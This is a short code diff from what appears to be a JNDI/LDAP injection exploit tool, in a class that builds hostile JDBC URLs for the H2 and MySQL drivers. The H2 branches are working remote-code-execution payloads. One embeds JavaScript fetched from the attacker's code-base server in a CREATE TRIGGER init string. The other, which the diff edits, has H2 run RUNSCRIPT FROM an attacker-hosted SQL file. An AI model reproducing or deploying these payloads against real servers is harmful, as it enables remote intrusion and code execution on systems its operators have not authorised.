@@ -143,7 +143,7 @@ public class TomcatOrDruidJdbc implements LDAPService{
             String javascript = HttpUtil.get(HTTPServer.codeBase + filename);
             jdbcUrl = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"+ javascript +"'";
         } else if (filename.endsWith(".sql") && database.equalsIgnoreCase("org.h2.Driver")) {
-            String sql = HttpUtil.get(HTTPServer.codeBase + filename);
+            String sql = HTTPServer.codeBase + filename;
             jdbcUrl = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '" + sql + "'";
         } else if (database.equalsIgnoreCase("com.mysql.jdbc.Driver")) {
             jdbcUrl = String.format("jdbc:mysql://%s:%s/test?%s", params[0], params[1], params[2]);
